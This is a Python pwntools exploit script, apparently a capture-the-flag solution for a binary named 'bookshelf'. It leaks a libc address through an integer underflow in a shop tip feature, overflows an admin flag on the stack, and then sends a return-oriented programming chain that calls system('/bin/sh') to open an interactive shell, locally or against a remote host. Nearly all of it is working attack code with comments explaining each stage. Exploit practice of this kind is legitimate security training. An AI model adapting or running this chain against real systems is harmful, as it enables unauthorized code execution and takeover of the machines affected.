#!/usr/bin/env python3

from pwn import *

elf = ELF("./bookshelf")
libc = ELF("./libc.so.6")
context.binary = elf

gdb_cmds = ["b * 0x0000000000401634"]
r = ["addr",1337]

def conf():
	if args.REMOTE:
		p = remote(r[0],r[1])
	else:
		p = process([elf.path])
		if args.GDB:
			gdb.attach(p,gdbscript='\n'.join(gdb_cmds))
	return p

p = conf()

def send(data):
	p.clean()
	p.sendline(data)

def main():

	# Integer underflow in the shop via the tip feature allows one to buy a leak of the puts address
	send("2")
	send("2")
	send("y")

	for i in range(10):
		send("2")
		send("3")
		send("y")

	send("2")
	send("3")
	p.readuntil("in all it's glory ")
	puts = int(p.readuntil(" ")[:-1],16)
	p.clean()
	log.success("puts @ "+str(hex(puts)))
	libc.address = puts-libc.symbols['puts']
	log.info("libc "+str(hex(libc.address)))
	send("n")

	# 6 byte overflow via string functions if audiobook is chosen
	# overflow admin flag in main (book is on main's stackframe)
	send("1")
	send("y")
	send("A"*40)

	# use option 3 to send rop chain
	rop = ROP(elf)
	rop.raw("A"*56)
	rop.raw(0x40101a) # empty ret
	rop.raw(libc.address+0x000000000002a3e5) # pop rdi; ret
	rop.raw(next(libc.search(b'/bin/sh')))
	rop.raw(libc.symbols['system'])

	send("3")
	send(rop.chain())
	send("4")

	p.interactive()


if __name__ == "__main__":
	main()
